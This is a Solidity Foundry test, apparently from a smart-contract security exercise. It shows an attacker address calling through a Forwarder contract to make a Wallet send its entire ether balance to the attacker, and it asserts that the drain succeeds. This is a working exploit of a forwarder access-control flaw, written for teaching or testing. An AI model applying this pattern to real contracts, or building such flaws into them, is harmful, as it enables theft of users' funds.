// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {Forwarder, Wallet} from "../src/Forwarder.sol";

pragma solidity ^0.8.0;

contract ForwarderTest is Test {
    Forwarder forwarder;
    Wallet wallet;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(victim, 10 ether);
        vm.startPrank(victim);
        forwarder = new Forwarder();
        wallet = new Wallet{value: 1 ether}(address(forwarder));
        vm.stopPrank();
        vm.deal(attacker, 1 ether);
    }

    function testForwarder() public {
        bytes memory data = abi.encodeWithSelector(Wallet.sendEther.selector, attacker, address(wallet).balance);
        uint256 attackerBalanceBefore = address(attacker).balance;
        vm.prank(attacker);
        forwarder.functionCall(address(wallet), data);

        uint256 attackerBalanceAfter = address(attacker).balance;
        assertEq(address(wallet).balance, 0);
        assertEq(attackerBalanceAfter - attackerBalanceBefore, 1 ether);
    }
}
